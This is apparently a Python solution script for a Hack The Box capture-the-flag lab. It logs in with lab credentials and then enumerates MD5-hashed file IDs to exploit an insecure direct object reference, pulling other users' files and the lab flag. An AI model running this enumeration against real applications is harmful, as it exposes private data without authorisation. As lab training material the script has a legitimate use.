#!/usr/bin/env python3
import requests
import re
import hashlib

# === Config Section ===
# Set the address for the target web application.
# Change HOST and PORT if you are testing a different server.
HOST = "94.237.50.221"
PORT = "49496"
BASE_URL = f"http://{HOST}:{PORT}"
LOGIN_URL = f"{BASE_URL}/index.php"
PROFILE_URL = f"{BASE_URL}/profile.php"
PROXY = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

# Credentials used for login. These are examples used in the lab environment.
USERNAME = "htb-stdnt"
PASSWORD = "Academy_student!"

# Optional: pre-existing PHP session id. If empty, requests.Session() will
# be assigned cookies by the server after the login POST.
PHPSESSID = ""  # Optional, can let requests manage it


if __name__ == "__main__":
    # === Initialize session ===
    # We use requests.Session so cookies and headers persist across requests.
    session = requests.Session()

    # Hardened headers: pretend to be a normal browser to avoid simple bot-detection
    # or behavior differences for non-browser clients.
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:142.0) Gecko/20100101 Firefox/142.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Referer": BASE_URL + "/",
        "Origin": BASE_URL,
    }

    # Optional: set PHPSESSID manually (if you want to emulate a fixed session)
    # If PHPSESSID is empty, this call does nothing harmful — the session will
    # continue to function and obtain cookies when the server sets them.
    session.cookies.set("PHPSESSID", PHPSESSID, domain=f"{HOST}", path="/")

    # === Step 1: Login POST ===
    # Many simple web apps use an HTML form with Username/Password fields; here we
    # replicate that form submission. The 'Submit' field mirrors the form button.
    data = {
        "Username": USERNAME,
        "Password": PASSWORD,
        "Submit": "Submit"
    }

    # We intentionally set allow_redirects=False so that we can inspect the server's
    # login response. A successful login commonly responds with a 302 redirect to
    # the profile page. Not following the redirect gives us a chance to verify that.
    login_resp = session.post(LOGIN_URL, headers=headers, data=data, allow_redirects=False)

    # Check for the expected login behavior: a 302 redirect to profile.php.
    if login_resp.status_code == 302 and 'Location' in login_resp.headers and login_resp.headers['Location'] == 'profile.php':
        print("[+] Login successful, redirected to profile.php")
    else:
        # If login failed or behaved unexpectedly, print helpful diagnostics and exit.
        print("[-] Login failed or unexpected response")
        print(f"Status: {login_resp.status_code}")
        print(f"Headers: {login_resp.headers}")
        exit(1)

    # === Step 2: Access profile.php ===
    # Now we actually GET the profile page using the same session. The session
    # keeps cookies (like PHPSESSID) so the server should show the logged-in profile.
    profile_resp = session.get(PROFILE_URL, headers=headers)

    if profile_resp.status_code == 200:
        print("[+] Accessed profile.php")
        # I need it to match htb-stdnt
        match = re.search(r'Welcome\s+(.*)', profile_resp.text)
        if match:
            print(f"[+] Found welcome string: {match.group(1)}")
        else:
            # Not fatal — just informs the user that the expected text wasn't found.
            print("[-] Welcome string not found.")
    else:
        print("[-] Failed to access profile.php")
        print(f"Status: {profile_resp.status_code}")
    print("\n")

    # === You can now use session for further authenticated requests! ===

    # Choose IDs 1..10 inclusive. The second argument to range() is exclusive.
    max_range = 10
    idor_range = range(1, max_range + 1)
    # Endpoint base for the IDOR-style request; we'll append the number.
    download_url = f'{BASE_URL}/file.php?file='
    
    for i in idor_range:
        # Hash the ID to create a unique identifier for the request
        id_hash = hashlib.md5(str(i).encode()).hexdigest()

        # Request the IDOR endpoint without following redirects. Many apps return
        # a 302 redirect that points to display_data.php; we want to observe that.
        download_resp = session.request("GET", download_url + id_hash, allow_redirects=False)

        # Print response headers only. Beginners can look for 'Location' or
        for header, value in download_resp.headers.items():
            if header.lower() == "Location".lower():
                # If value contains the string Access denied, print it differently
                if "profile.php?error=Access+denied!" in value:
                    print(f"id ({i}) - {id_hash} > {header}: {value}")

                    # Download the content again, this time following redirects. Then we will get the file contents.
                    content = session.request("GET", download_url + id_hash, allow_redirects=True)
                    
                    ## Extract data between <p>...</p>
                    # re.DOTALL lets '.' match newlines so multi-line paragraph content is captured.
                    data_matches = re.findall(r'<p>(.*?)</p>', content.text, re.DOTALL)
                    if data_matches:
                        for data in data_matches:
                            if "flag: HTB" in data:
                                print(data.strip())


